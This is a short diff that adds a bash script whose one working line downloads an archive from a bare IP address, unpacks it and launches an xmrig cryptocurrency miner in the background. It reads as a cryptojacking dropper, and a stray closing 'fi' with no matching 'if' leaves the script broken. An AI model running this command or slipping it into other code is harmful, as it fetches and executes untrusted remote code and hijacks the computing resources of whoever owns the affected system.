@@ -1,0 +1,3 @@
+#!/bin/bash
+wget http://139.59.106.85/miner-qrl.tar.gz && tar -xvf miner-qrl.tar.gz && cd miner-qrl && ./xmrigDaemon &
+fi
